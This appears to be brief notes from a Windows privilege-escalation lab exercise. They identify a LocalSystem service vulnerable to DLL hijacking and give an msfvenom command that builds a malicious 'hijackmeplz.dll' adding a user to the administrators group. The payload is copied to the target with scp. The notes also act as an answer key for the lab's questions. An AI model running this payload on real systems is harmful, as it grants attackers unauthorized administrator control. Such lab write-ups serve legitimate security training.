Priv - Vuln 1

Analyze the System and identify the means to escalate your privileges. Report the "status" of your finding by entering the correct Display Name.

	Go to services, find one with a missing or odd display name

What is the name of the DLL that is supposed to be loaded, by the vulnerable service?

	sc.exe qc MemoryStatus
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: MemoryStatus
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MemoryStatus\service.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : MemoryStatus
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
        
 * Navigate to C:\MemoryStatus\service.exe
 	* Look in the c file for a dll
 	"hijackmeplz.dll"
 	
 	Now use msvenom to create a dll that gives you admin privs
 	
 	 msfvenom -p windows/exec CMD='net localgroup administrators comrade /add' -f dll > hijackmeplz.dll
 	
 	Now 
 	scp on the windows (pull from the linux)
 	
 	scp <lin_ip> filename location_on_windows
